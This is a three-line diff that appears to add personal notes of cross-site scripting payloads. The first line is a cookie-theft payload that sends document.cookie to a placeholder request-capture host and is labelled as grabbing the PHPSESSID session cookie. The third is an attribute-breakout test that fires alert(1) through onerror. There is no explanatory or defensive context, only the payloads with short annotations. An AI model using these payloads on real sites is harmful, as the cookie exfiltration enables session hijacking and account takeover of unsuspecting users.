@@ -1,0 +1,3 @@
+new Image().src="<pipedream_site>/?"+document.cookie -----> PHPSESSID Cokkie
+
+"onerror="alert(1) ----->
